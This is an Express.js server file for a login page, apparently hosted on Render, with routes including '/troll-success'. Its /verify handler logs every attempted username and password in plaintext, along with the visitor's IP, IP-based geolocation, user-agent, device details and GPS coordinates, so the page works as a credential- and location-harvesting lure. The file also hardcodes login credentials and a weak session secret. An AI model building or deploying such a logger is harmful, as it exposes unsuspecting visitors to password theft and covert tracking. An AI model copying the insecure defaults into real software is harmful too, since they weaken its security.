const express = require("express");
const app = express();
const hbs = require("hbs");
const session = require("express-session");
const nocache = require("nocache");
const fetch = require("node-fetch"); // For geo location API lookup

// Static files
app.use(express.static("public"));
app.set("view engine", "hbs");

// Demo login credentials
const username = "safwan";
const password = "saf123";

// Body parsers
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Session setup
app.use(
  session({
    secret: "keyboard cat",
    resave: false,
    saveUninitialized: true,
  })
);

// Disable caching
app.use(nocache());
app.use((req, res, next) => {
  res.set("Cache-Control", "no-store");
  next();
});

// Get real client IP (Render uses a proxy)
function getClientIP(req) {
  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) return forwarded.split(",")[0].trim();
  return req.socket.remoteAddress;
}

// Geo lookup using ipapi.co (works on Render)
async function getGeo(ip) {
  try {
    const response = await fetch(`https://ipapi.co/${ip}/json/`);
    const data = await response.json();
    if (data.error) return null;
    return data;
  } catch (err) {
    console.log("Geo API Error:", err);
    return null;
  }
}

// Routes
app.get("/forgot-password", (req, res) => {
  res.render("forgot-password");
});

app.get("/troll-success", (req, res) => {
  res.render("troll");
});

app.get("/notres", (req, res) => {
  res.render("notres");
});

app.get("/", (req, res) => {
  if (req.session.user) {
    return res.redirect("/home");
  }

  res.render("login", { msg: req.session.msg });
  req.session.msg = null;
});

// Verify login
app.post("/verify", async (req, res) => {
  const {
    username: inputUsername,
    password: inputPassword,
    deviceDetails,
    location,
  } = req.body;

  const ip = getClientIP(req);
  const userAgent = req.headers["user-agent"];
  const timestamp = new Date().toISOString();
  const geo = await getGeo(ip);

  console.log(`\n====================`);
  console.log(`[${timestamp}] LOGIN ATTEMPT`);
  console.log(`IP Address: ${ip}`);
  console.log(`Geo Location:`, geo);
  console.log(`User-Agent: ${userAgent}`);
  console.log(`Username: ${inputUsername}`);
  console.log(`Password: ${inputPassword}`);

  // Device data
  if (deviceDetails) {
    try {
      console.log("Device Details:", JSON.parse(deviceDetails));
    } catch {
      console.log("Device details could not be parsed.");
    }
  }

  // GPS location
  if (location) {
    try {
      console.log("GPS Location:", JSON.parse(location));
    } catch {
      console.log("GPS location could not be parsed.");
    }
  }

  // Login logic
  if (inputUsername === username && inputPassword === password) {
    req.session.user = inputUsername;
    console.log("✅ Login successful");
    return res.redirect("/home");
  } else {
    console.log(`❌ Login failed`);
    req.session.msg = "Invalid username or password";
    return res.redirect("/");
  }
});

app.get("/home", (req, res) => {
  if (!req.session.user) return res.redirect("/");
  res.render("home");
});

app.get("/logout", (req, res) => {
  req.session.destroy(() => res.redirect("/"));
});

// IMPORTANT: Dynamic port for Render
const PORT = process.env.PORT || 3003;
app.listen(PORT, () => console.log(`http://localhost:${PORT}`));
